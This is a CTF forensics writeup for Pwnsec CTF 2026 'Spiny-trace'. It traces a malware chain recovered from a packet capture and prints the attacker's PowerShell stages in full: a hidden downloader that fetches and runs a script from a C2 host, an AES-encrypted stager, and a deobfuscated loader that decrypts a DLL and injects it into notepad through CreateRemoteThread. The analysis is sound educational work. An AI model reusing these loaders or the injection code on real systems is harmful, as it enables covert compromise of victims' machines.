---
title: "Pwnsec CTF 2026: Spiny-trace Forensics Writeup"
date: 2026-09-16
categories: 
  - "forensics"
  - "dump analysis"
tags: 
  - "forensics"
  - "ctf"
  - "pwnsecctf"
  - "pcap"

---

Okay, I admit I started enjoying malware analysis type of forensics CTF challenges. Finding how malware infiltrated a system, exfiltrated data, how it combined and encrypted them, how it sent... I don't know why but it is just magical, like an author discovery writing their plot, it just piece by piece reveals itself.

Anyways, enough palaver, let's get to the topic. I got another writeup-ish for another challenge from `Pwnsec CTF 2026: Spiny-trace`. Another forensics challenge, and malware analysis type, what a surprise :) Unfortunately, I looked at this challenge after the CTF ended, and I no longer have access to questions. So I will go over the attack and how to recover the exflitrated data, I am sure most of the questions would be part of this writeup in someway or another.

## Attack Summary

We are given the pcap file. Just looking around the file we can easily find who is victim and who is C2:

```
danger = 192.168.59.152	
victim = 192.168.59.133
```

Next step is looking at http requests between these two to see what has been sent and received:

![alt text](/assets/img/spiny_http1.png)

We can already see malicious activity, let's extract the objects:

```
tshark -r challenge.pcapng -Y "http.request" -Y "ip.addr == 192.168.59.152" -w - | tshark -r - --export-objects http,./extract
```

![http downloads](/assets/img/spiny_http2.png)

Timing of these HTTP requests give us a nice summary of the attack chain:

```
update.ps1 -> windows.ps1 -> object.dat -> captcha.bin -> chrome_elevator.exe
```

After chrome elevator exe is downloaded, we can notice some TCP communication between victim and attacker on port `4444`. This is a malware analysis challenge, so that communication is most likely encrypted exfiltrated data sent from victim to the C2 server. We will come to this at the very end of this writeup. In summary:

1. `update.ps1` downloads `windows.ps1`

2. `windows.ps1` downloads object.dat

3. Then `captcha.bin` is downloaded 

4. This leads to `chrome_elevator.exe`

5. And finally data exfiltrated to C2 on port 4444

Just a very basic flow of the attack. To follow the attack from beginning, let's start with the first script

## Update.ps1

Starting with first powershell script `update.ps1`, it is a clear and easy to follow downloader script:

```powershell
try {
    Write-Host "Wait please, don't close this window..."
    
    $scriptBlock = {
        IEX (New-Object Net.WebClient).DownloadString('http://192.168.59.152/user_profiles_photo/windows.ps1')
    }
    
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"& { $scriptBlock }`""
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.CreateNoWindow = $true
    $psi.UseShellExecute = $false
    
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $psi
    $process.Start() | Out-Null
    
} catch {
    
}
```

## Windows.ps1

There isn't much to talk about update.ps1, it just downloads another ps1 script from C2 server, here a bit cleaned/reformatted version of `windows.ps1`

```powershell
$k=[Convert]::FromBase64String('abXd3Jz/lRf4tk7NE1qCdTyDE58rcc1ogbwmowrwY0k=');
$iv=[Convert]::FromBase64String('DJ5TBOQsmADMnLtHkGoDPA==');
$e=[Convert]::FromBase64String('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');

$a=New-Object ("Security.Cryptography.Aes"+"Managed");
$a.Mode='CBC';
$a.Padding='PKCS7';
$a.Key=$k;
$a.IV=$iv;
$d=$a.CreateDecryptor();

$rukp=$d.TransformFinalBlock($e,0,$e.Length);
$tuez=[Text.Encoding]::UTF8.GetString($rukp);. ([ScriptBlock]::Create($tuez))
```

This one is more interesting. It contains encrypted data, but we are given keys and IV to decrypt it:

```python
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad


# Encryption is AES CBC + PKCS7
enc = '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'
k = 'abXd3Jz/lRf4tk7NE1qCdTyDE58rcc1ogbwmowrwY0k='
iv = 'DJ5TBOQsmADMnLtHkGoDPA=='

k = base64.b64decode(k)
iv = base64.b64decode(iv)
enc = base64.b64decode(enc)

print(k.hex())
print(iv.hex())
print(enc[0:64].hex())

cipher = AES.new(k, AES.MODE_CBC, iv)
dec_padded = cipher.decrypt(enc)
decrypted = unpad(dec_padded, AES.block_size)

print(decrypted.decode('utf-8'))

with open('windowsps1_decrypted.ps1', 'w', encoding='utf-8') as f:
    f.write(decrypted.decode('utf-8'))
```

Decrypted file is another encrypted and obfuscated powershell script:

```powershell
$rukp = @('$EncodedString="a','HR0cDovLzE5','Mi4xNjguNTk','uMTUyL3VzZX','JfcHJvZmlsZ','XNfcGhvdG8v','b2JqZWN0LmR','hdA=="
$De','codedBytes=','[System.Con','vert]::From','Base64Strin','g($EncodedS','tring)
$ur','l=[System.T','ext.Encodin','g]::UTF8.Ge','tString($De','codedBytes)','
$encrypte','dData=(New-','Object Net.','WebClient).','DownloadDat','a($url)
$a','es=[System.','Security.Cr','yptography.','Aes]::Creat','e()
$aes.M','ode=1
$aes','.Padding=3
','
$keyHex="8','a4a35876563','f1ea8baad6c','da0099c24d5','3d4ce5670b3','b23b1306312','7611bb37"
','$keyBytes=N','ew-Object b','yte[] 32
f','or($i=0;$i-','lt32;$i++){','$keyBytes[$','i]=[Convert',']::ToByte($','keyHex.Subs','tring($i*2,','2),16)}
$a','es.Key=$key','Bytes
$ivH','ex="c0a6753','60817d8dba6','2cc79e2fa77','734"
$ivBy','tes=New-Obj','ect byte[] ','16
for($i=','0;$i-lt16;$','i++){$ivByt','es[$i]=[Con','vert]::ToBy','te($ivHex.S','ubstring($i','*2,2),16)}
','
$aes.IV=$i','vBytes
$de','cryptor=$ae','s.CreateDec','ryptor()
$','decryptedDa','ta=$decrypt','or.Transfor','mFinalBlock','($encrypted','Data,0,$enc','ryptedData.','Length)
$d','ecryptor.Di','spose()
$a','es.Dispose(',')
$tempDll','=[System.IO','.Path]::Get','TempFileNam','e()+".dll"
','
[System.IO','.File]::Wri','teAllBytes(','$tempDll,$d','ecryptedDat','a)
Add-Typ','e -TypeDefi','nition "usi','ng System;u','sing System','.Runtime.In','teropServic','es;public c','lass N{[Dll','Import(`"ke','rnel32`")]p','ublic stati','c extern In','tPtr OpenPr','ocess(uint ','a,bool b,ui','nt c);[DllI','mport(`"ker','nel32`")]pu','blic static',' extern Int','Ptr Virtual','AllocEx(Int','Ptr a,IntPt','r b,uint c,','uint d,uint',' e);[DllImp','ort(`"kerne','l32`")]publ','ic static e','xtern bool ','WriteProces','sMemory(Int','Ptr a,IntPt','r b,byte[] ','c,uint d,ou','t IntPtr e)',';[DllImport','(`"kernel32','`")]public ','static exte','rn IntPtr C','reateRemote','Thread(IntP','tr a,IntPtr',' b,uint c,I','ntPtr d,Int','Ptr e,uint ','f,out uint ','g);[DllImpo','rt(`"kernel','32`")]publi','c static ex','tern IntPtr',' GetProcAdd','ress(IntPtr',' a,string b',');[DllImpor','t(`"kernel3','2`")]public',' static ext','ern IntPtr ','GetModuleHa','ndle(string',' a);[DllImp','ort(`"kerne','l32`")]publ','ic static e','xtern uint ','WaitForSing','leObject(In','tPtr a,uint',' b);[DllImp','ort(`"kerne','l32`")]publ','ic static e','xtern bool ','CloseHandle','(IntPtr a);','[DllImport(','`"kernel32`','")]public s','tatic exter','n bool Virt','ualFreeEx(I','ntPtr a,Int','Ptr b,uint ','c,uint d);}','"
$pro=Get','-Process -N','ame "notepa','d" -ErrorAc','tion Silent','lyContinue
','
if(-not $p','ro){Start-P','rocess "C:\','Windows\Sys','tem32\notep','ad.exe" -Wi','ndowStyle H','idden;Start','-Sleep 2;$p','ro=Get-Proc','ess "notepa','d"}
$procI','d=$pro[0].I','d
$h=[N]::','OpenProcess','(0x1F0FFF,$','false,$proc','Id)
$b=[Sy','stem.Text.E','ncoding]::A','SCII.GetByt','es($tempDll','+"`0")
$a=','[N]::Virtua','lAllocEx($h',',[IntPtr]::','Zero,$b.Len','gth,0x3000,','0x04)
$w=[','IntPtr]::Ze','ro
[N]::Wr','iteProcessM','emory($h,$a',',$b,$b.Leng','th,[ref]$w)','
$l=[N]::G','etProcAddre','ss([N]::Get','ModuleHandl','e("kernel32','.dll"),"Loa','dLibraryA")','
$t=0
$th','=[N]::Creat','eRemoteThre','ad($h,[IntP','tr]::Zero,0',',$l,$a,0,[r','ef]$t)
if(','$th-ne[IntP','tr]::Zero){','[N]::WaitFo','rSingleObje','ct($th,5000',')|Out-Null;','[N]::CloseH','andle($th)}','
[N]::Virt','ualFreeEx($','h,$a,0,0x80','00)
[N]::C','loseHandle(','$h)
Start-','Sleep 2
tr','y{Remove-It','em $tempDll',' -Force -Er','rorAction S','ilentlyCont','inue}catch{','}'); $rukp = $rukp -join ''; . ([ScriptBlock]::Create($rukp))
```

### Decrypted Powershell

Deobfuscation isn't too difficult. We just need to combine/join some scripts and a bit of editing magic we get this:

```powershell
$rukp = @('
$DecodedBytes= "http://192.168.59.152/user_profiles_photo/object.dat"
$url=[System.Text.Encoding]::UTF8.GetString($DecodedBytes)
$encryptedData=(New-Object Net.WebClient).DownloadData($url)
$aes=[System.Security.Cryptography.Aes]::Create()
$aes.Mode=1
$aes.Padding=3

$keyHex="8a4a35876563f1ea8baad6cda0099c24d53d4ce5670b3b23b13063127611bb37"
$keyBytes=New-Object byte[] 32
for($i=0;$i-lt32;$i++){$keyBytes[$i]=[Convert]::ToByte($keyHex.Substring($i*2,2),16)}
$aes.Key=$keyBytes
$ivHex="c0a675360817d8dba62cc79e2fa77734"
$ivBytes=New-Object byte[] 16
for($i=0;$i-lt16;$i++){$ivBytes[$i]=[Convert]::ToByte($ivHex.Substring($i*2,2),16)}

$aes.IV=$ivBytes
$decryptor=$aes.CreateDecryptor()
$decryptedData=$decryptor.TransformFinalBlock($encryptedData,0,$encryptedData.Length)
$decryptor.Dispose()
$aes.Dispose()
$tempDll=[System.IO.Path]::GetTempFileName()+".dll"

[System.IO.File]::WriteAllBytes($tempDll,$decryptedData)
Add-Type -TypeDefinition 
"
using System;
using System.Runtime.InteropServices;
public class N
{
[DllImport(`"kernel32`")]
public static extern IntPtr OpenProcess(uint a,bool b,uint c);

[DllImport(`"kernel32`")]
public static extern IntPtr VirtualAllocEx(IntPtr a,IntPtr b,uint c,uint d,uint e);

[DllImport(`"kernel32`")]
public static extern bool WriteProcessMemory(IntPtr a,IntPtr b,byte[] c,uint d,out IntPtr e);

[DllImport(`"kernel32`")]
public static extern IntPtr CreateRemoteThread(IntPtr a,IntPtr b,uint c,IntPtr d,IntPtr e,uint f,out uint g);

[DllImport(`"kernel32`")]
public static extern IntPtr GetProcAddress(IntPtr a,string b);

[DllImport(`"kernel32`")]
public static extern IntPtr GetModuleHandle(string a);

[DllImport(`"kernel32`")]
public static extern uint WaitForSingleObject(IntPtr a,uint b);

[DllImport(`"kernel32`")]
public static extern bool CloseHandle(IntPtr a);

[DllImport(`"kernel32`")]
public static extern bool VirtualFreeEx(IntPtr a,IntPtr b,uint c,uint d);}
"


$pro=Get-Process -Name "notepad" -ErrorAction SilentlyContinue

if(-not $pro){Start-Process "C:\Windows\System32\notepad.exe" -WindowStyle Hidden;Start-Sleep 2;$pro=Get-Process "notepad"}
$procId=$pro[0].Id
$h=[N]::OpenProcess(0x1F0FFF,$false,$procId)
$b=[System.Text.Encoding]::ASCII.GetBytes($tempDll+"`0")
$a=[N]::VirtualAllocEx($h,[IntPtr]::Zero,$b.Length,0x3000,0x04)
$w=[IntPtr]::Zero
[N]::WriteProcessMemory($h,$a,$b,$b.Length,[ref]$w)
$l=[N]::GetProcAddress([N]::GetModuleHandle("kernel32.dll"),"LoadLibraryA")
$t=0
$th=[N]::CreateRemoteThread($h,[IntPtr]::Zero,0,$l,$a,0,[ref]$t)
if($th-ne[IntPtr]::Zero){[N]::WaitForSingleObject($th,5000)|Out-Null;[N]::CloseHandle($th)}
